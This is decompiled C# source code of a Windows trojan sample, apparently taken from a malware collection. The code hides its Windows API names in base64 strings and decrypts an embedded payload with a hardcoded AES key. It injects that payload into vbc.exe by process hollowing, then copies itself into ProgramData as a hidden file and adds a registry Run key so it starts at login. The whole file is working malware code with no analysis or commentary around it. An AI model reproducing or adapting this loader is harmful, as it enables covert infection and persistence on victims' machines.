// Decompiled with JetBrains decompiler
// Type: Program.Main
// Assembly: msnmsnger, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EBC3C99E-8397-4D1B-98C9-82E828583544
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Crypt.bhmu-2a96b31aef71ebb044cb16a236e8bc228f3bb561551f30cf7efc096b6c9d5ef1.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;
using My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Program
{
  public class Main : Form
  {
    private IContainer Components;
    private const string qF1Us8BawKRPzja7V = "kernel32";

    [STAThread]
    public static void Main() => Application.Run((Form) new Program.Main());

    public Main()
    {
      this.Load += new EventHandler(this.Main_Load);
      Application.EnableVisualStyles();
      this.InitializeComponent();
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1, 1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Name = nameof (Main);
      this.Text = nameof (Main);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    protected override void Dispose(bool Disposing)
    {
      if (Disposing && this.Components != null)
        this.Components.Dispose();
      base.Dispose(Disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
    }

    [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true, BestFitMapping = false)]
    public static extern Program.Main.qZbADDDCp6xpAaq8C LoadLibrary(string qZbADDDCp6xpAaq8C);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(
      Program.Main.qZbADDDCp6xpAaq8C qUy4dxsc219lWIgjiHFh,
      string qCIUcneeGzhNbnhoztL9L);

    public T qn96x5ZnhA6tawmtqVMi<T>(string qBGwXBeHTq9TnQUyTl, string q2aRb1rQCQF4QdvCY) => (T) Marshal.GetDelegateForFunctionPointer(Program.Main.GetProcAddress(Program.Main.LoadLibrary(qBGwXBeHTq9TnQUyTl), q2aRb1rQCQF4QdvCY), typeof (T));

    public bool qEx4OJ8Tfqldwfk29nf(byte[] qOg29UIl9IbFeuzbUi, string qKt9Fq7oMDo8oF3ak4pA)
    {
      Program.Main.qiIyO8tk2AvKAZJrpvCqy o8tk2AvKazJrpvCqy = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qiIyO8tk2AvKAZJrpvCqy>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
      Program.Main.q9xCgdK8Uo8O52FiV q9xCgdK8Uo8O52FiV = this.qn96x5ZnhA6tawmtqVMi<Program.Main.q9xCgdK8Uo8O52FiV>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
      Program.Main.q6OLnplGTl528wnrm56J olnplGtl528wnrm56J = this.qn96x5ZnhA6tawmtqVMi<Program.Main.q6OLnplGTl528wnrm56J>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
      Program.Main.qLKPmBmeiEP4mCrC5ah1t bmeiEp4mCrC5ah1t = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qLKPmBmeiEP4mCrC5ah1t>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
      Program.Main.qLT4Fwvbp3VkVuG6JV2AI fwvbp3VkVuG6Jv2Ai = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qLT4Fwvbp3VkVuG6JV2AI>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
      Program.Main.qD2M7DuDXwdMhQqzk d2M7DuDxwdMhQqzk = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qD2M7DuDXwdMhQqzk>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
      Program.Main.qIwKwWs8SigGzDdtiJ iwKwWs8SigGzDdtiJ = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qIwKwWs8SigGzDdtiJ>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
      Program.Main.qGP2mNth2j253Dtf9lAY gp2mNth2j253Dtf9lAy = this.qn96x5ZnhA6tawmtqVMi<Program.Main.qGP2mNth2j253Dtf9lAY>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
      bool flag;
      try
      {
        IntPtr zero1 = IntPtr.Zero;
        IntPtr[] qXOz5NpBE1Xb4fGcV = new IntPtr[4];
        byte[] qId3gZCuKdO6nHNAo = new byte[68];
        int int32_1 = BitConverter.ToInt32(qOg29UIl9IbFeuzbUi, 60);
        int int16 = (int) BitConverter.ToInt16(qOg29UIl9IbFeuzbUi, checked (int32_1 + 6));
        IntPtr qH8xJRNQPdFjOe6mXOVq = new IntPtr(BitConverter.ToInt32(qOg29UIl9IbFeuzbUi, checked (int32_1 + 84)));
        if (o8tk2AvKazJrpvCqy((string) null, new StringBuilder(qKt9Fq7oMDo8oF3ak4pA), zero1, zero1, false, 4, zero1, (string) null, qId3gZCuKdO6nHNAo, qXOz5NpBE1Xb4fGcV))
        {
          uint[] numArray1 = new uint[179];
          numArray1[0] = 65538U;
          if (q9xCgdK8Uo8O52FiV(qXOz5NpBE1Xb4fGcV[1], numArray1))
          {
            IntPtr qDt9R85eELG5WW8Al = new IntPtr(checked ((long) numArray1[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            IntPtr qHR7FpKytYbhJONuDS = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (olnplGtl528wnrm56J(qXOz5NpBE1Xb4fGcV[0], qDt9R85eELG5WW8Al, ref zero2, (int) qHR7FpKytYbhJONuDS, ref zero3) && gp2mNth2j253Dtf9lAy(qXOz5NpBE1Xb4fGcV[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(qOg29UIl9IbFeuzbUi, checked (int32_1 + 52)));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(qOg29UIl9IbFeuzbUi, checked (int32_1 + 80)));
              IntPtr qruddT4aqgcOvc8cq = bmeiEp4mCrC5ah1t(qXOz5NpBE1Xb4fGcV[0], num1, num2, 12288, 64);
              int int32_2 = qruddT4aqgcOvc8cq.ToInt32();
              int qJkX8og7WeFcjwFlbGR;
              int num3 = fwvbp3VkVuG6Jv2Ai(qXOz5NpBE1Xb4fGcV[0], qruddT4aqgcOvc8cq, qOg29UIl9IbFeuzbUi, checked ((uint) (int) qH8xJRNQPdFjOe6mXOVq), qJkX8og7WeFcjwFlbGR) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) qOg29UIl9IbFeuzbUi, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                byte[] numArray2 = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) qOg29UIl9IbFeuzbUi, dst[5], (Array) numArray2, 0, numArray2.Length);
                num2 = new IntPtr(checked (int32_2 + dst[3]));
                num1 = new IntPtr(numArray2.Length);
                int num6 = fwvbp3VkVuG6Jv2Ai(qXOz5NpBE1Xb4fGcV[0], num2, numArray2, checked ((uint) (int) num1), qJkX8og7WeFcjwFlbGR) ? 1 : 0;
                checked { ++num5; }
              }
              num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
              num1 = new IntPtr(4);
              int num7 = fwvbp3VkVuG6Jv2Ai(qXOz5NpBE1Xb4fGcV[0], num2, BitConverter.GetBytes(qruddT4aqgcOvc8cq.ToInt32()), checked ((uint) (int) num1), qJkX8og7WeFcjwFlbGR) ? 1 : 0;
              numArray1[44] = checked ((uint) (qruddT4aqgcOvc8cq.ToInt32() + BitConverter.ToInt32(qOg29UIl9IbFeuzbUi, int32_1 + 40)));
              int num8 = d2M7DuDxwdMhQqzk(qXOz5NpBE1Xb4fGcV[1], numArray1) ? 1 : 0;
            }
          }
          int num = (int) iwKwWs8SigGzDdtiJ(qXOz5NpBE1Xb4fGcV[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_11;
      }
      flag = true;
label_11:
      return flag;
    }

    private void Main_Load(object sender, EventArgs e)
    {
      RuntimeHelpers.GetObjectValue(My.Resources.Resources.ResourceManager.GetObject("qiyn7mi4X3yNykrzDG4ni"));
      this.qEx4OJ8Tfqldwfk29nf(this.qJ4QkqHolIuMfwPEl1chs(My.Resources.Resources.qiyn7mi4X3yNykrzDG4ni), Encoding.UTF8.GetString(Convert.FromBase64String("QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2Mi4wLjUwNzI3XHZiYy5leGU=")));
      try
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Sys32c.exe";
        if (!MyProject.Computer.FileSystem.FileExists(str))
        {
          MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str);
          MyProject.Computer.Registry.SetValue(Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")), "DefaultSystem", (object) str);
          FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(str);
          fileInfo.IsReadOnly = true;
          fileInfo.Attributes |= FileAttributes.Hidden;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Close();
    }

    public byte[] qJ4QkqHolIuMfwPEl1chs(byte[] qw24jOFLNAXWXnBnrXS)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 36,
          (byte) 136,
          (byte) 186,
          (byte) 126,
          (byte) 148,
          (byte) 205,
          (byte) 221,
          (byte) 27,
          (byte) 219,
          (byte) 104,
          (byte) 237,
          (byte) 236,
          (byte) 6,
          (byte) 136,
          (byte) 143,
          (byte) 10
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 10,
          (byte) 143,
          (byte) 136,
          (byte) 6,
          (byte) 236,
          (byte) 237,
          (byte) 104,
          (byte) 219,
          (byte) 27,
          (byte) 221,
          (byte) 205,
          (byte) 148,
          (byte) 126,
          (byte) 186,
          (byte) 136,
          (byte) 36
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(qw24jOFLNAXWXnBnrXS, 0, qw24jOFLNAXWXnBnrXS.Length);
      }
    }

    public sealed class qZbADDDCp6xpAaq8C : SafeHandleZeroOrMinusOneIsInvalid
    {
      private qZbADDDCp6xpAaq8C()
        : base(true)
      {
      }

      protected override bool ReleaseHandle() => Program.Main.qtf1W7ywElL355kPSnN.FreeLibrary(this.handle);
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qiIyO8tk2AvKAZJrpvCqy(
      string qBGwXBeHTq9TnQUyTl,
      StringBuilder qIYXZmJ6QxBDsnn5I1L,
      IntPtr q2aRb1rQCQF4QdvCY,
      IntPtr qSlhyNbK11NPzR3HAbmyr,
      [MarshalAs(UnmanagedType.Bool)] bool q3E85ZCmbQBSGt5ORC,
      int qCCU9g1H6YfNB6EHT,
      IntPtr qNjnyAkRQw7Qm8iiAbUk,
      string q3gigOesIS1o8OdLfbKaT,
      byte[] qId3gZCuKdO6nHNAo,
      IntPtr[] qXOz5NpBE1Xb4fGcV);

    public delegate bool qLT4Fwvbp3VkVuG6JV2AI(
      IntPtr qYzI48YAPQqM6n5CCYGyg,
      IntPtr qruddT4aqgcOvc8cq,
      byte[] q2lCRXxgth6L7Pqlx,
      uint qH8xJRNQPdFjOe6mXOVq,
      int qJkX8og7WeFcjwFlbGR);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool q6OLnplGTl528wnrm56J(
      IntPtr qaE3HDW9qdNgl1SX7y,
      IntPtr qDt9R85eELG5WW8Al,
      ref IntPtr qGyKD4emsVLFe5bu5hX7,
      int qHR7FpKytYbhJONuDS,
      ref IntPtr qKePlsdbQVjBUsfD8us);

    public delegate IntPtr qLKPmBmeiEP4mCrC5ah1t(
      IntPtr qLkGtgdQ23bvsY2ZSRUZe,
      IntPtr qCfr59M1vxqeHXfgFaDPk,
      IntPtr qryApRRFzXscO97rApg,
      int qPTIbxZ9Fj7y36XgK4,
      int qCTvdjOBHiXjaewbfJt);

    public delegate uint qGP2mNth2j253Dtf9lAY(
      IntPtr qlqzm2S38bjN9JYbDS8o,
      IntPtr qbhvwmbD764Uprhlne);

    public delegate uint qIwKwWs8SigGzDdtiJ(IntPtr qrEdKxWnR6EukElNe5);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool q9xCgdK8Uo8O52FiV(IntPtr qxwf9ejzNnkdO2bitg7S, uint[] qiLrtCGqKB94PS5RP4a);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qD2M7DuDXwdMhQqzk(IntPtr qblXhL4ejddetPK4jO7Z, uint[] qg1CLW7J8xfcaJhK2A);

    public sealed class qtf1W7ywElL355kPSnN
    {
      private const string qG2u3l62gMqRvHJKAEW = "kernel32";

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
      [DllImport("kernel32", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool FreeLibrary(IntPtr qCnX5gPi7d4Lfxlhi);
    }
  }
}
